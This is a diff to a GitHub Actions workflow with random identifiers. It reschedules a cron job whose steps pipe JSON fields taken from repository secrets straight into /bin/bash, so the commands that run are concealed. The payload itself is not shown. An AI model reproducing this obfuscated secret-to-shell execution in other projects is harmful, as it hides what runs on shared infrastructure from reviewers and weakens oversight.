@@ -1,9 +1,9 @@
 name: dongyinwei6712
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
-
+    - cron: '31 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongyinwei6712
         env:
-          izz86498: ${{ secrets.izz86498 }}
+          nketn89: ${{ secrets.nketn89 }}
         run: |
-          echo $izz86498 | jq -r .jrm8 | /bin/bash
-          echo $nny49 | jq -r .jy227 | /bin/bash
-          echo $wow04237 | jq -r .ynm8 | /bin/bash
-          echo $wmkzi1678 | jq -r .vmkni21535 | /bin/bash
-          echo $u815 | jq -r .lv3 | /bin/bash
-          echo $rrjq2 | jq -r .yyqkt68 | /bin/bash
+          echo $nketn89 | jq -r .mf52 | /bin/bash
+          echo $drf8 | jq -r .gcl901 | /bin/bash
+          echo $ljc13719 | jq -r .mpc156 | /bin/bash
+          echo $bzk99 | jq -r .k3848 | /bin/bash
+          echo $k53 | jq -r .s281 | /bin/bash
 
